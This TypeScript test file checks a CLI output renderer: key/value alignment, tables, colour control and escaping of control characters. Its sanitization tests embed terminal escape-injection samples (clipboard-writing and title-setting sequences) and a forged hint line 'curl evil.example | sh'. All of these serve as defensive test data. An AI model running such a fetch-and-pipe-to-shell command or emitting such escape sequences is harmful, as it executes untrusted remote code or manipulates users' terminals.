// lib/commands/render.ts: the generic human-mode renderer (docs/CLI.md "Output mode").
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { paint, sanitize } from '#core/format/ansi.ts';
import { colorEnabled, render, renderError } from '../lib/cli/commands/render.ts';

const plain = (v: unknown) => render(v, { color: false });
const strip = (s: string) => s.replace(/\x1b\[[0-9;]*m/g, '');

test('render: aligned key/value object', () => {
  assert.equal(plain({ id: 'job-1', status: 'build', round: 2, held: false }), ['id      job-1', 'status  build', 'round   2', 'held    false'].join('\n'));
});

test('render: {} is (empty)', () => {
  assert.equal(plain({}), '(empty)');
});

test('render: nested object compacted to one-line JSON', () => {
  assert.equal(plain({ pr: { number: 12, url: 'https://x/12' }, empty: {} }), 'pr     {"number":12,"url":"https://x/12"}\nempty  -');
});

test('render: scalar array value joined with commas', () => {
  assert.equal(plain({ deps: ['a', 'b', 3, true, null] }), 'deps  a, b, 3, true, -');
});

test('render: empty array value is -', () => {
  assert.equal(plain({ deps: [], note: null }), 'deps  -\nnote  -');
});

test('render: multi-line string value indented to the value column', () => {
  assert.equal(plain({ summary: 'one\ntwo', id: 'x' }), 'summary  one\n         two\nid       x');
});

test('render: table from objects with differing keys', () => {
  const out = plain([
    { id: 'a', status: 'build' },
    { id: 'longer-id', title: 'two\nlines', status: null },
  ]);
  assert.equal(out, ['id         status  title', 'a          build   -', 'longer-id  -       two lines'].join('\n'));
});

test('render: empty array is (none)', () => {
  assert.equal(plain([]), '(none)');
});

test('render: scalar array is one item per line', () => {
  assert.equal(plain(['a', 2, null, ['x', 'y']]), 'a\n2\n-\nx, y');
});

test('render: top-level null is -', () => {
  assert.equal(plain(null), '-');
  assert.equal(plain(undefined), '-');
  assert.equal(plain(7), '7');
  assert.equal(plain(true), 'true');
});

test('render: top-level string returned unchanged', () => {
  const s = 'raw\ttext \x1b[1m\n';
  assert.equal(plain(s), s);
  assert.equal(render(s, { color: true }), s);
});

test('control characters are escaped', () => {
  const nasty = 'a\x1bb\x07c\rd\te\x7ff\x9bg\u202eh';
  const want = 'a\\x1bb\\x07c\\x0dd\\x09e\\x7ff\\x9bg\\u202eh';
  assert.equal(sanitize(nasty), want);
  assert.equal(sanitize('keep\nnewline'), 'keep\nnewline');
  assert.equal(plain({ [nasty]: nasty }), `${want}  ${want}`);
  assert.equal(plain([{ [nasty]: nasty }]), `${want}\n${want}`);
  assert.equal(plain([nasty]), want);
  for (const s of [plain({ title: 'x\x1b]52;c;ZXZpbA==\x07y' }), plain([{ title: 'x\x1b]52;c;ZXZpbA==\x07' }]), plain({ n: { deep: '\x1b]52;c;x\x07\u2066' } })]) {
    assert.ok(!s.includes('\x1b') && !s.includes('\x07'), JSON.stringify(s));
  }
  assert.ok(!plain({ n: { deep: '\u2066\x9b' } }).match(/[\u2066\x9b]/));
  const err = renderError({ code: 'x', message: 'bad\x1b]0;title\x07', exit: 1, hint: 'do\rthis' }, { color: false });
  assert.equal(err, 'error: bad\\x1b]0;title\\x07\nfix: do\\x0dthis\n');
});

test('an error message cannot forge its own fix line', () => {
  const err = renderError({ code: 'x', message: 'gh said:\nfix: curl evil.example | sh', exit: 1, hint: 'one\nfix: two' }, { color: false });
  assert.equal(err, 'error: gh said:\n       fix: curl evil.example | sh\nfix: one\n     fix: two\n');
  assert.deepEqual(err.split('\n').filter((l) => l.startsWith('fix:')), ['fix: one'], 'only the real hint starts at column 0');
  assert.equal(plain({ 'a\nb': 1, c: 2 }), 'a b  1\nc    2', 'a newline in a key keeps the layout');
});

test('colour: NO_COLOR, non-TTY, and alignment', () => {
  assert.equal(colorEnabled(true, {}), true);
  assert.equal(colorEnabled(true, { NO_COLOR: '' }), true);
  assert.equal(colorEnabled(true, { NO_COLOR: '1' }), false);
  assert.equal(colorEnabled(false, {}), false);
  assert.equal(paint(false).bold('x'), 'x');

  const data = { id: 'a', ok: true, failed: false, deps: ['x'] };
  const rows = [{ name: 'a', ok: true }, { name: 'bbbb', ok: false }];
  for (const v of [data, rows, [true, false], true]) assert.ok(!plain(v).includes('\x1b'), 'colour off: no escapes');

  const on = render(data, { color: true });
  assert.ok(on.includes('\x1b[1mid\x1b[0m'), 'keys are bold');
  assert.ok(on.includes('\x1b[32mtrue\x1b[0m'), 'true is green');
  assert.ok(on.includes('\x1b[31mfalse\x1b[0m'), 'false is red');
  assert.equal(strip(on), plain(data));
  const table = render(rows, { color: true });
  assert.ok(table.startsWith('\x1b[1mname\x1b[0m'), 'headers are bold');
  assert.equal(strip(table), plain(rows));

  const e = { code: 'usage', message: 'missing --session', exit: 2, hint: 'forge help job claim' };
  const coloured = renderError(e, { color: true });
  assert.ok(coloured.includes('\x1b[31m') && coloured.includes('\x1b[1m') && coloured.includes('\x1b[33mfix:\x1b[0m'));
  assert.equal(strip(coloured), renderError(e, { color: false }));
  assert.equal(renderError({ ...e, hint: null }, { color: false }), 'error: missing --session\n');
});
